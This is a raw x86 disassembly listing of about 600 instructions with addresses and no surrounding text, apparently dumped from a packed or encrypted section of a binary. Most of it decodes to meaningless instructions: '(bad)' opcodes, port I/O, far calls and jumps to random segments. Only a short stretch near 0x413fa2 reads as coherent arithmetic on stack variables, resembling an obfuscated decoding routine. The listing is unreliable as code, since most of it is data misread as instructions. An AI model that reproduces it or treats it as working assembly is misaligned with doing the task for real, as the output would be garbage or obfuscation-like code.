  413e76:	repnz leave 
  413e78:	daa    
  413e79:	jno    0x413ef5
  413e7b:	rol    DWORD PTR [ecx+0x3b5317a8],cl
  413e81:	xlat   BYTE PTR ds:[ebx]
  413e82:	mov    bl,0x51
  413e84:	xor    eax,0x5bc0300c
  413e89:	cmp    al,BYTE PTR [esi-0x2876a950]
  413e8f:	ror    BYTE PTR [edx-0x34],0x5b
  413e93:	sbb    BYTE PTR [eax-0x361ab344],dh
  413e99:	add    cl,ah
  413e9b:	into   
  413e9c:	cld    
  413e9d:	ret    0x1250
  413ea0:	aas    
  413ea1:	adc    esp,DWORD PTR [eax-0x4e]
  413ea4:	outs   dx,DWORD PTR ds:[esi]
  413ea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ea6:	je     0x413e7d
  413ea8:	mov    al,ds:0x4428a649
  413ead:	repz jno 0x413ec9
  413eb0:	lods   al,BYTE PTR ds:[esi]
  413eb1:	xor    eax,DWORD PTR [edx+edi*4-0x5a]
  413eb5:	int    0xb6
  413eb7:	adc    BYTE PTR [esi],bh
  413eb9:	add    eax,0xccd690fc
  413ebe:	push   es
  413ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ec0:	mov    bl,0x64
  413ec2:	sbb    al,0x4
  413ec4:	mov    ch,BYTE PTR [eax]
  413ec6:	pusha  
  413ec7:	(bad)  
  413ec9:	cwde   
  413eca:	xor    BYTE PTR [ebx+0x5a],bh
  413ecd:	sbb    BYTE PTR [ecx+eiz*2],0xc3
  413ed1:	repz mov eax,0xdb6164c6
  413ed7:	cmp    dl,BYTE PTR [edx+0x5d15fce8]
  413edd:	mov    esi,0xafa1e49
  413ee2:	retf   0xb850
  413ee5:	xchg   ebp,eax
  413ee6:	bound  edi,QWORD PTR [edx]
  413ee8:	or     eax,0x9b4f29cf
  413eed:	aaa    
  413eee:	(bad)  
  413eef:	call   FWORD PTR [edi-0x37926701]
  413ef5:	inc    esp
  413ef6:	enter  0xa3a,0x75
  413efa:	cmp    edx,0x36b84226
  413f00:	ret    
  413f01:	daa    
  413f02:	mov    BYTE PTR [ecx+0x6d73d0bf],cl
  413f08:	stos   DWORD PTR es:[edi],eax
  413f09:	dec    esi
  413f0a:	les    esi,FWORD PTR [eax]
  413f0c:	mov    ch,0xf4
  413f0e:	mov    bh,0xf5
  413f10:	xor    al,0x7e
  413f12:	ror    BYTE PTR [ecx-0xc],cl
  413f15:	out    dx,al
  413f16:	add    eax,ebp
  413f18:	test   DWORD PTR [esi-0x5e],0x26798c71
  413f1f:	xchg   ebx,eax
  413f20:	push   edx
  413f21:	aad    0x60
  413f23:	int3   
  413f24:	jb     0x413f8d
  413f26:	jg     0x413f76
  413f28:	push   esp
  413f29:	(bad)  
  413f2a:	nop
  413f2b:	mov    edx,0x238520cb
  413f30:	fsub   st,st(6)
  413f32:	push   ss
  413f33:	mov    al,ds:0xcb45a4ac
  413f38:	mov    ebp,0x80470c8c
  413f3d:	pop    edx
  413f3e:	dec    edi
  413f3f:	lea    ecx,[esi+0x77bf4706]
  413f45:	sbb    eax,0xef63a63c
  413f4a:	inc    ebp
  413f4b:	sbb    BYTE PTR [ecx-0x3c],bl
  413f4e:	and    bh,0x45
  413f51:	test   bh,ch
  413f53:	push   0xc5a2f986
  413f58:	ss gs mov edi,0x488dbbbf
  413f5f:	loop   0x413fe0
  413f61:	ss sub ebx,esp
  413f64:	outs   dx,DWORD PTR ds:[esi]
  413f65:	call   0x8363:0xc963a1e9
  413f6c:	fnsave [eax]
  413f6e:	fild   DWORD PTR [esi-0x38]
  413f71:	loopne 0x413f6e
  413f73:	sub    ebx,edx
  413f75:	jle    0x413f23
  413f77:	add    ebp,DWORD PTR [eax-0x1d]
  413f7a:	dec    esp
  413f7b:	ds xchg esi,eax
  413f7d:	or     eax,0xed4d1e25
  413f82:	jno    0x413fbc
  413f84:	xchg   ecx,eax
  413f85:	mov    al,0xd2
  413f87:	popa   
  413f88:	clc    
  413f89:	mov    bl,0x53
  413f8b:	or     DWORD PTR [ebx+0xc038591],ebx
  413f91:	jge    0x413f33
  413f93:	jnp    0x413f3e
  413f95:	cmc    
  413f96:	fiadd  DWORD PTR [ebp+0x558b5202]
  413f9c:	or     BYTE PTR [ebx-0x2fcc07a3],cl
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	jge    0x413fd4
  414015:	xchg   esp,eax
  414016:	dec    esi
  414017:	mov    ds:0xeb7c7c74,al
  41401c:	pop    edi
  41401d:	jl     0x41409b
  41401f:	pop    ebp
  414020:	push   eax
  414021:	mov    cl,0x1d
  414023:	div    DWORD PTR [ecx+0x6]
  414026:	fisub  DWORD PTR ds:0x78be51b7
  41402c:	sbb    al,BYTE PTR [edi-0x61]
  41402f:	iret   
  414030:	daa    
  414031:	or     BYTE PTR [ebp+edi*2+0x5fc9b1a1],dh
  414038:	cmp    DWORD PTR ds:0x8236b439,edx
  41403e:	icebp  
  41403f:	mov    esi,0x9500cb54
  414044:	int3   
  414045:	ja     0x413fe7
  414047:	cdq    
  414048:	repnz cwde 
  41404a:	aam    0x28
  41404c:	xor    dh,BYTE PTR [eax-0x3af4644a]
  414052:	loope  0x41406e
  414054:	jmp    0x4cea:0x83e1455d
  41405b:	jb     0x414001
  41405d:	xor    al,dl
  41405f:	cmp    eax,0xb7f19500
  414064:	sti    
  414065:	add    edi,0x4b
  414068:	jg     0x4140d7
  41406a:	and    ecx,DWORD PTR [esi+0x15]
  41406d:	mul    DWORD PTR [edx+0xf62be30]
  414073:	and    ebp,esi
  414075:	test   DWORD PTR [esi+0x5],edi
  414078:	jle    0x4140e2
  41407a:	or     DWORD PTR [esi],esp
  41407c:	into   
  41407d:	xor    ebp,DWORD PTR [edi]
  41407f:	add    ecx,DWORD PTR [ecx+edi*1-0x4b]
  414083:	pusha  
  414084:	sbb    DWORD PTR [esp+ebp*2-0x74],eax
  414088:	lods   al,BYTE PTR ds:[esi]
  414089:	and    esi,DWORD PTR [ecx]
  41408b:	shl    DWORD PTR [ebx],1
  41408d:	and    DWORD PTR [edx-0x28],ebx
  414090:	sub    ebp,esi
  414092:	and    al,0x15
  414094:	jge    0x414052
  414096:	pop    edx
  414097:	std    
  414098:	stos   DWORD PTR es:[edi],eax
  414099:	dec    edi
  41409a:	pusha  
  41409b:	out    0x66,al
  41409d:	scas   al,BYTE PTR es:[edi]
  41409e:	stos   DWORD PTR es:[edi],eax
  41409f:	cdq    
  4140a0:	jle    0x4140e3
  4140a2:	xor    ecx,0xffffff9b
  4140a5:	and    al,0xc6
  4140a7:	fiadd  WORD PTR [ebx-0x6f]
  4140aa:	stc    
  4140ab:	shl    DWORD PTR [edx-0xe],cl
  4140ae:	vmovhps xmm7,xmm0,QWORD PTR [esi-0x36]
  4140b3:	mov    ebp,0xb82970d8
  4140b8:	sub    edi,DWORD PTR [eax-0x4a]
  4140bb:	xchg   ebx,eax
  4140bc:	push   edi
  4140bd:	xchg   dl,al
  4140bf:	inc    ecx
  4140c0:	outs   dx,BYTE PTR ds:[esi]
  4140c1:	mov    ebp,0x1650bab5
  4140c6:	xchg   edi,eax
  4140c7:	mov    eax,DWORD PTR [ecx+ecx*2+0x5a3b5d6b]
  4140ce:	shl    DWORD PTR [esi+0x5d],cl
  4140d1:	int3   
  4140d2:	test   ebp,ecx
  4140d4:	pusha  
  4140d5:	sbb    eax,0xcfea15a6
  4140da:	or     cl,bh
  4140dc:	jb     0x414073
  4140de:	addr16 xchg ebp,eax
  4140e0:	push   esi
  4140e1:	jle    0x4140a4
  4140e3:	stos   DWORD PTR es:[edi],eax
  4140e4:	and    BYTE PTR [edx+0x15],0x21
  4140e8:	mov    bh,dl
  4140ea:	aas    
  4140eb:	jl     0x41410f
  4140ed:	fimul  WORD PTR [ecx-0x742ad4a3]
  4140f3:	dec    ebx
  4140f4:	enter  0x82aa,0xf4
  4140f8:	scas   al,BYTE PTR es:[edi]
  4140f9:	sbb    ch,BYTE PTR [edi-0x32]
  4140fc:	ins    BYTE PTR es:[edi],dx
  4140fd:	jg     0x4140c2
  4140ff:	cmc    
  414100:	lock bsf ecx,DWORD PTR [ebx-0x52]
  414105:	xchg   edi,eax
  414106:	cdq    
  414107:	or     DWORD PTR [ecx+0x7ec80551],edx
  41410d:	add    ebp,DWORD PTR [edx+0x3e]
  414110:	inc    esp
  414111:	ja     0x4140d3
  414113:	sbb    bl,BYTE PTR [edi-0x22ff6280]
  414119:	mov    ch,cl
  41411b:	ins    BYTE PTR es:[edi],dx
  41411c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41411d:	push   ds
  41411e:	push   esi
  41411f:	cmp    al,0x28
  414121:	add    eax,0x41279e73
  414126:	out    0x2a,eax
  414128:	push   ss
  414129:	int    0x84
  41412b:	pop    esp
  41412c:	mov    al,ds:0x73a286ec
  414131:	add    DWORD PTR [eax+esi*2-0x6f],ebp
  414135:	and    eax,0x9e61787d
  41413a:	shr    BYTE PTR [edi-0x7fae7b58],0x1d
  414141:	out    0xdb,eax
  414143:	mov    al,0x3d
  414145:	test   eax,0x89275df3
  41414a:	fistp  WORD PTR [ecx-0x11d1f3b4]
  414150:	push   edi
  414151:	bound  esp,QWORD PTR [ebp-0x2a]
  414154:	aam    0x10
  414156:	fsubr  QWORD PTR [ebx-0x64]
  414159:	jae    0x41416d
  41415b:	mov    bl,0x80
  41415d:	cs fxch st(5)
  414160:	inc    ebp
  414161:	adc    ecx,DWORD PTR [esi+0x21c2add3]
  414167:	sub    eax,0x3b27be3f
  41416c:	jp     0x41415d
  41416e:	push   es
  41416f:	mov    ds:0xbab0b6c6,eax
  414174:	fwait
  414175:	jbe    0x414129
  414177:	in     al,0xa4
  414179:	push   edx
  41417a:	jne    0x41412e
  41417c:	xchg   edi,eax
  41417d:	sub    ebx,DWORD PTR [edx]
  41417f:	outs   dx,BYTE PTR ds:[esi]
  414180:	mov    DWORD PTR [esi-0x32],0xd910ad5d
  414187:	aam    0x1a
  414189:	xor    esi,0x44
  41418c:	scas   al,BYTE PTR es:[edi]
  41418d:	push   ecx
  41418e:	sub    al,0x5
  414190:	cmc    
  414191:	stos   DWORD PTR es:[edi],eax
  414192:	loop   0x414202
  414194:	mov    al,0x1b
  414196:	in     eax,0xf9
  414198:	xor    BYTE PTR [edx],0xc2
  41419b:	push   es
  41419c:	xchg   esp,eax
  41419d:	cs push eax
  41419f:	xchg   edi,eax
  4141a0:	sub    eax,0xc67c8a05
  4141a5:	outs   dx,BYTE PTR ds:[esi]
  4141a6:	push   ds
  4141a7:	rcr    BYTE PTR [eax],1
  4141a9:	fucom  st(6)
  4141ab:	xchg   DWORD PTR [ecx+0x47],edx
  4141ae:	pop    edx
  4141af:	inc    eax
  4141b0:	mov    dl,0xe9
  4141b2:	push   0x52c161b
  4141b7:	jno    0x414238
  4141b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ba:	mov    ebp,0xc0073adc
  4141bf:	mov    ecx,0x5a46a58a
  4141c4:	mov    ebp,0xe91f41dd
  4141c9:	push   esi
  4141ca:	mov    edi,0x7ff24b70
  4141cf:	or     DWORD PTR [edi],0x5b74c45e
  4141d5:	inc    edx
  4141d6:	push   esp
  4141d7:	jmp    0x41418b
  4141d9:	lods   eax,DWORD PTR ds:[esi]
  4141da:	leave  
  4141db:	nop
  4141dc:	scas   eax,DWORD PTR es:[edi]
  4141dd:	aaa    
  4141de:	call   0xe71d:0xe7209b50
  4141e5:	pop    ecx
  4141e6:	fld    DWORD PTR [eax-0x72268e51]
  4141ec:	mov    esp,0x3dffa8c9
  4141f1:	xor    DWORD PTR cs:[eax+eax*4],esp
  4141f5:	aaa    
  4141f6:	mov    cs,WORD PTR [ecx+0x69ca00a4]
  4141fc:	test   al,0xf4
  4141fe:	data16 setbe BYTE PTR cs:[edi]
  414203:	xchg   ecx,eax
  414204:	call   0x85770048
  414209:	ret    
  41420a:	loopne 0x41418e
  41420c:	lds    esi,FWORD PTR es:[ebx]
  41420f:	and    edi,DWORD PTR [edi]
  414211:	sbb    DWORD PTR [edx+0x395747d6],0xffffffdf
  414218:	es pop bp
  41421b:	data16 jecxz 0x41424b
  41421e:	cli    
  41421f:	data16 stos BYTE PTR es:[edi],al
  414221:	out    dx,eax
  414222:	inc    esp
  414223:	outs   dx,DWORD PTR ds:[esi]
  414224:	arpl   si,si
  414226:	jnp    0x414292
  414228:	mov    esp,0x36589aad
  41422d:	rcl    DWORD PTR [esi-0x3db5ea46],1
  414233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414234:	push   edi
  414235:	xor    eax,0x7ad2948e
  41423a:	ss daa 
  41423c:	retf   0xf63a
  41423f:	jge    0x41426e
  414241:	les    edi,FWORD PTR ds:0x2088ee0a
  414247:	and    eax,0x243f5c95
  41424c:	(bad)  
  41424e:	psubw  mm6,QWORD PTR [ebx]
  414251:	jg     0x414247
  414253:	or     al,0x53
  414255:	daa    
  414256:	jge    0x4141e5
  414258:	add    DWORD PTR [ecx+edi*4-0x241b0d04],esp
  41425f:	mov    dl,0x7e
  414261:	dec    esp
  414262:	mov    ds:0x35a1fc3e,al
  414267:	cmc    
  414268:	scas   eax,DWORD PTR es:[edi]
  414269:	aam    0xd7
  41426b:	call   0x7c1b1af9
  414270:	sbb    eax,0x4525680c
  414275:	mov    ds:0xc9d49eff,al
  41427a:	dec    esp
  41427b:	jae    0x414212
  41427d:	mov    dl,0xa9
  41427f:	push   ds
  414280:	dec    edi
  414281:	out    dx,eax
  414282:	(bad)  
  414283:	sbb    eax,0x663e5980
  414288:	xor    eax,0xa6707a9b
  41428d:	addr16 push esp
  41428f:	and    ch,BYTE PTR [eax-0x1fbd9426]
  414295:	ss xchg edx,eax
  414297:	and    al,0x3a
  414299:	and    BYTE PTR [edx],0x3c
  41429c:	mov    cl,0x8d
  41429e:	push   ecx
  41429f:	(bad)  
  4142a0:	xchg   edx,eax
  4142a1:	bnd jo 0x41423a
  4142a4:	in     al,0xff
  4142a6:	xchg   esi,eax
  4142a7:	mov    eax,ds:0x8c1821c5
  4142ac:	xor    BYTE PTR [ebx-0x649915ad],0x8f
  4142b3:	or     edi,DWORD PTR [esi-0x3a]
  4142b6:	fs and al,0xa9
  4142b9:	leave  
  4142ba:	or     BYTE PTR [edx-0x51],al
  4142bd:	push   ecx
  4142be:	sub    esi,DWORD PTR [ebp+0x9a95d14]
  4142c4:	mov    WORD PTR [ebx-0x660542e6],?
  4142ca:	ja     0x4142a2
  4142cc:	xchg   BYTE PTR ds:0x43dce4ed,bh
  4142d2:	les    ecx,FWORD PTR [ebp+0x2ca17f22]
  4142d8:	push   es
  4142d9:	adc    bl,bh
  4142db:	xor    ecx,eax
  4142dd:	sar    BYTE PTR [edi+0x32],0x47
  4142e1:	or     BYTE PTR [esp+ebp*8-0x78],bh
  4142e5:	dec    ebx
  4142e6:	into   
  4142e7:	fild   WORD PTR [edi-0x3a6dc344]
  4142ed:	xor    dh,BYTE PTR [eax]
  4142ef:	int3   
  4142f0:	call   0x3c17f59c
  4142f5:	inc    ecx
  4142f6:	jecxz  0x4142b8
  4142f8:	mov    ch,0xa6
  4142fa:	aas    
  4142fb:	mov    dh,0xab
  4142fd:	sub    eax,0xd1a8e3e9
  414302:	fisub  WORD PTR [ecx+0x2aea908e]
  414308:	or     eax,0xa67dfb79
  41430d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41430e:	xchg   DWORD PTR [edx-0x5b],ebp
  414311:	sbb    ebp,DWORD PTR [eax]
  414313:	xchg   esi,eax
  414314:	xchg   ecx,eax
  414315:	call   0xddb3:0xa0a04540
  41431c:	pop    ss
  41431d:	mov    ebp,0x4e1aeed4
  414322:	adc    al,0xfd
  414324:	addr16 jl 0x414354
  414327:	sub    al,0x35
  414329:	hlt    
  41432a:	inc    edi
  41432b:	jg     0x414334
  41432d:	inc    eax
  41432e:	jecxz  0x4143a6
  414330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414331:	aad    0x1f
  414333:	ins    BYTE PTR es:[edi],dx
  414334:	or     BYTE PTR [esi],ah
  414336:	fs call 0xc360c6f9
  41433c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41433d:	cwde   
  41433e:	push   0xfffffff2
  414340:	cwde   
  414341:	inc    edx
  414342:	mov    eax,ds:0x9db6d281
  414347:	fadd   QWORD PTR [edx]
  414349:	dec    ebx
  41434a:	and    BYTE PTR [ebp+0x12099871],ah
  414350:	xlat   BYTE PTR ds:[ebx]
  414351:	pop    esp
  414352:	les    edi,FWORD PTR [ebx+0x58]
  414355:	or     al,0x72
  414357:	jno    0x4143b7
  414359:	pop    eax
  41435a:	popa   
  41435b:	scas   al,BYTE PTR es:[edi]
  41435c:	push   0x64
  41435e:	es sbb al,0x1c
  414361:	xor    dl,BYTE PTR ds:0x8aeb4ac4
  414367:	add    eax,0xea58c56b
  41436c:	sbb    DWORD PTR [esi],ebp
  41436e:	jmp    0x4143ee
  414370:	or     edi,0x60
  414373:	das    
  414374:	mov    edx,0x4052b55f
  414379:	or     dh,BYTE PTR [esi+0x554266f8]
  41437f:	test   al,0xe7
  414381:	pop    ebx
  414382:	sbb    BYTE PTR [ebp-0x2b9b87b1],dh
  414388:	sbb    cl,dh
  41438a:	cmp    eax,0x4372d21c
  41438f:	fst    QWORD PTR [ecx-0x1d]
  414392:	mov    dh,0x76
  414394:	in     al,0x3d
  414396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414397:	sub    al,ch
  414399:	jge    0x4143d8
  41439b:	pop    ebp
  41439c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41439d:	pop    eax
  41439e:	cmc    
  41439f:	icebp  
  4143a0:	lahf   
  4143a1:	or     esi,esp
  4143a3:	imul   esp,DWORD PTR ds:0x32024870,0x95566a18
  4143ad:	inc    ebp
  4143ae:	push   eax
  4143af:	mov    ah,0x49
  4143b1:	inc    eax
  4143b2:	aad    0x13
  4143b4:	(bad)  
  4143b6:	sahf   
  4143b7:	pop    esi
  4143b8:	fst    st(4)
  4143ba:	mov    ch,0x39
  4143bc:	cdq    
  4143bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143be:	and    esp,DWORD PTR [esi+0x23]
  4143c1:	mov    ch,BYTE PTR ds:0xaaf61836
  4143c7:	data16 lahf 
  4143c9:	dec    esp
  4143ca:	cmp    BYTE PTR [ebx],0x76
  4143cd:	lods   al,BYTE PTR ds:[esi]
  4143ce:	jb     0x4143d4
  4143d0:	mov    edi,DWORD PTR [ebx]
  4143d2:	into   
  4143d3:	out    0xeb,al
  4143d5:	push   esi
  4143d6:	(bad)  
  4143d8:	ins    DWORD PTR es:[edi],dx
  4143d9:	and    al,0x22
  4143db:	jle    0x4143f8
  4143dd:	push   eax
  4143de:	jecxz  0x41445c
  4143e0:	fsubr  QWORD PTR [ebx+0x38]
  4143e3:	mov    ah,0x4b
  4143e5:	clc    
  4143e6:	aaa    
  4143e7:	outs   dx,BYTE PTR ds:[esi]
  4143e8:	mov    gs,WORD PTR [edi]
  4143ea:	mov    ds:0xa145c99f,al
  4143ef:	mov    ebp,0xd2208950
  4143f4:	mov    DWORD PTR [eax-0x23],0x3ebf9e3a
  4143fb:	xchg   esi,eax
  4143fc:	sub    esp,DWORD PTR [esp+eiz*2]
  4143ff:	cli    
  414400:	popf   
  414401:	push   esi
  414402:	adc    BYTE PTR [edi-0x7e025529],bl
  414408:	or     ebx,DWORD PTR [ebp-0x3753927c]
  41440e:	mov    dh,BYTE PTR [edx-0x2afc9f3]
  414414:	(bad)  
  414415:	sti    
  414416:	inc    edx
  414417:	xchg   esi,eax
  414418:	xchg   ecx,eax
  414419:	jb     0x4143ca
  41441b:	push   es
  41441c:	lea    edx,[edx]
  41441e:	fsub   QWORD PTR [edi+eax*1+0x7ffdde71]
  414425:	lahf   
  414426:	das    
  414427:	pop    ebp
  414428:	outs   dx,DWORD PTR ds:[esi]
  414429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41442a:	test   bl,bh
  41442c:	jg     0x41449a
  41442e:	dec    esp
  41442f:	or     BYTE PTR [esi-0x170b27b2],0x2e
  414436:	loope  0x41441b
  414438:	push   edi
  414439:	popf   
  41443a:	or     DWORD PTR [edx+0x23ac652d],esi
  414440:	pop    es
  414441:	in     al,dx
  414442:	hlt    
  414443:	pop    ss
  414444:	push   0x36
  414446:	and    eax,0x293875ce
  41444b:	inc    ecx
  41444c:	mov    ?,WORD PTR [eax]
  41444e:	in     al,0xb9
  414450:	popf   
  414451:	mov    BYTE PTR [esi+esi*8+0x16dd6f00],ah
  414458:	test   al,0xf1
  41445a:	inc    esi
  41445b:	pop    es
  41445c:	xor    cl,cl
  41445e:	push   esi
  41445f:	inc    ecx
  414460:	pop    ecx
  414461:	mov    ds:0x438f5a76,eax
  414466:	mov    ecx,0xe95734d0
  41446b:	sti    
  41446c:	cmc    
  41446d:	jp     0x4144e5
  41446f:	ror    DWORD PTR [edi+0x50],0xec
  414473:	inc    ebp
  414474:	lods   al,BYTE PTR ds:[esi]
  414475:	imul   eax,DWORD PTR [ecx+0x1334ba93],0x5e
  41447c:	or     eax,edi
  41447e:	inc    esp
  41447f:	lds    edx,FWORD PTR [ebp+0x644871e5]
  414485:	push   ecx
  414486:	pop    es
  414487:	jmp    0x4144ae
  414489:	bound  esi,QWORD PTR [ecx+ebx*4+0x67de2ae1]
  414490:	push   ds
  414491:	(bad)  
  414493:	outs   dx,BYTE PTR ds:[esi]
  414494:	mov    bh,0xc
  414496:	jmp    0x2424d620
  41449b:	and    al,0x79
  41449d:	add    eax,0x44008607
  4144a2:	js     0x414478
  4144a4:	int3   
  4144a5:	into   
  4144a6:	jmp    0x4804:0x1c62223d
  4144ad:	adc    DWORD PTR [edi+0x676388f0],esp
  4144b3:	and    ebx,DWORD PTR [edi-0x58bb6fb4]
  4144b9:	push   edi
  4144ba:	or     ecx,DWORD PTR [eax]
  4144bc:	pop    esi
  4144bd:	(bad)  
  4144be:	(bad)
  4144c1:	scas   al,BYTE PTR es:[edi]
  4144c2:	mov    al,ds:0xc87b32a7
  4144c7:	sbb    edx,esp
  4144c9:	sub    al,0xce
  4144cb:	cmp    cl,dl
  4144cd:	pop    edi
  4144ce:	pop    eax
  4144cf:	test   BYTE PTR [ecx-0x6e],0x99
  4144d3:	sub    DWORD PTR [edx-0x5336bffb],ebp
  4144d9:	inc    ebp
  4144da:	sbb    DWORD PTR [ecx+0x4a],0x796a72e1
  4144e1:	bound  eax,QWORD PTR [esi+eiz*1+0x33]
  4144e5:	pop    es
  4144e6:	xchg   esi,eax
  4144e7:	lock mov bh,0xd4
  4144ea:	adc    al,0x43
  4144ec:	push   ss
  4144ed:	out    0xe9,eax
  4144ef:	fistp  DWORD PTR [ebx]
  4144f1:	dec    edx
  4144f2:	jns    0x414490
  4144f4:	stos   BYTE PTR es:[edi],al
  4144f5:	jo     0x414568
  4144f7:	mov    fs,WORD PTR ds:0x685d15a5
  4144fd:	mov    ds:0x5ce0f5da,al
  414502:	xlat   BYTE PTR ds:[ebx]
  414503:	outs   dx,BYTE PTR ds:[esi]
  414504:	mov    ecx,0xbf47ef0a
  414509:	mov    ebp,0xbc955f9c
  41450e:	and    al,0xaa
  414510:	cmp    eax,esp
  414512:	dec    eax
  414513:	push   eax
  414514:	js     0x41452c
  414516:	cld    
  414517:	scas   eax,DWORD PTR es:[edi]
  414518:	push   cs
  414519:	add    eax,0x2b103624
  41451e:	cmp    eax,0x42471dc9
  414523:	cmp    DWORD PTR [edx+edx*4],0x5f
  414527:	or     ebx,ecx
  414529:	inc    edx
  41452a:	xor    bh,BYTE PTR [ebx]
  41452c:	scas   eax,DWORD PTR es:[edi]
  41452d:	(bad)  
  41452e:	mov    bl,0xaa
  414530:	fstp   DWORD PTR [edi-0x2600deb4]
  414537:	adc    al,0x40
  414539:	bound  esi,QWORD PTR [ebx]
  41453b:	inc    ebx
  41453c:	fst    QWORD PTR [edx]
  41453e:	outs   dx,DWORD PTR ds:[esi]
  41453f:	xor    edx,DWORD PTR [eax+ebx*2+0x7c5bd4e]
  414546:	mov    dl,BYTE PTR [ebx+eax*8-0x446fa832]
  41454d:	sub    al,0xeb
  41454f:	sub    eax,0x18a5ef03
  414554:	jecxz  0x41456d
  414556:	fistp  WORD PTR [esi]
  414558:	or     cl,bl
  41455a:	aaa    
  41455b:	icebp  
  41455c:	xchg   esi,eax
  41455d:	shr    BYTE PTR [ebp-0x49],cl
  414560:	jo     0x4144fb
  414562:	dec    edx
  414563:	xchg   esp,eax
  414564:	add    eax,0xfb298903
  414569:	std    
  41456a:	mov    dl,0xd9
  41456c:	fs push 0x24
  41456f:	sub    BYTE PTR [ebp-0x47f7f069],ch
  414575:	enter  0xbf69,0x52
  414579:	cmp    esp,DWORD PTR [eax+0x6a]
  41457c:	pop    ebx
  41457d:	(bad)  
  41457e:	xlat   BYTE PTR ds:[ebx]
  41457f:	push   edi
  414580:	retf   
  414581:	out    dx,al
  414582:	jb     0x4145aa
  414584:	push   ebp
  414585:	and    dl,BYTE PTR [edx]
  414587:	mov    ebp,0x654d69ad
  41458c:	(bad)  
  41458d:	push   esp
  41458e:	mov    edi,DWORD PTR [edi+0x60]
  414591:	dec    ecx
  414592:	mov    bl,BYTE PTR [edx-0xe]
  414595:	push   cs
  414596:	or     al,0x86
  414598:	jmp    0x4145ed
  41459a:	adc    DWORD PTR [edi+edx*1-0x69],0x4d
  41459f:	fsub   DWORD PTR [ebx]
  4145a1:	cmp    ebp,DWORD PTR [esi+0x27955baf]
  4145a7:	adc    esp,esi
  4145a9:	dec    edi
  4145aa:	or     BYTE PTR [esi+0x40],0x22
  4145ae:	hlt    
  4145af:	mov    bl,0x46
  4145b1:	push   ds
  4145b2:	pop    es
  4145b3:	dec    ebp
  4145b4:	pusha  
  4145b5:	enter  0x2262,0x2c
  4145b9:	stc    
  4145ba:	push   edi
  4145bb:	mov    cx,0xdc0d
  4145bf:	das    
  4145c0:	add    bh,bl
  4145c2:	fsubr  DWORD PTR [ebx+edi*1-0x13daf287]
  4145c9:	or     BYTE PTR [ebx-0x80],bl
  4145cc:	(bad)  
  4145cd:	fstp   QWORD PTR [edi-0x4b]
  4145d0:	fimul  WORD PTR [edi+0x2f]
  4145d3:	sbb    eax,0x7f30b9c2
  4145d8:	mov    esp,0xf1a0c44a
  4145dd:	shl    BYTE PTR [eax+0x78682d8e],0x2
  4145e4:	leave  
  4145e5:	and    BYTE PTR [ecx+0x43],cl
  4145e8:	jae    0x414594
  4145ea:	ror    DWORD PTR [edx],0xee
  4145ed:	cld    
  4145ee:	aad    0xbe
  4145f0:	pushf  
  4145f1:	pop    ds
  4145f2:	sbb    BYTE PTR [ecx],bl
  4145f4:	mov    ?,WORD PTR [eax+edi*8]
  4145f7:	test   dl,cl
  4145f9:	gs mov ch,0xe2
  4145fc:	mov    ebp,0xf8ae6e9d
  414601:	aas    
  414602:	lods   al,BYTE PTR ds:[esi]
  414603:	mov    al,0xa4
  414605:	(bad)
  414609:	fdivr  DWORD PTR [eax-0x68]
  41460c:	test   eax,0x29bca34c
  414611:	mov    ch,0x51
  414613:	outs   dx,BYTE PTR ds:[esi]
  414614:	pop    edx
  414615:	neg    DWORD PTR [esi-0x580954b3]
  41461b:	mov    ebp,0xb24a462e
  414620:	jo     0x4145b5
  414622:	(bad)  
  414623:	js     0x414613
  414625:	gs out 0xf1,al
  414628:	lods   eax,DWORD PTR cs:[esi]
  41462a:	std    
  41462b:	and    DWORD PTR [esi],ebx
  41462d:	jp     0x414635
  41462f:	sbb    eax,0x4c7ab306
  414634:	adc    bl,BYTE PTR [edx+edx*1-0x5163c50f]
  41463b:	xor    ecx,DWORD PTR [eax+edi*8+0x23]
  41463f:	cwde   
  414640:	imul   eax,ebp,0xa7697616
  414646:	fcmovu st,st(2)
  414648:	jnp    0x4145d0
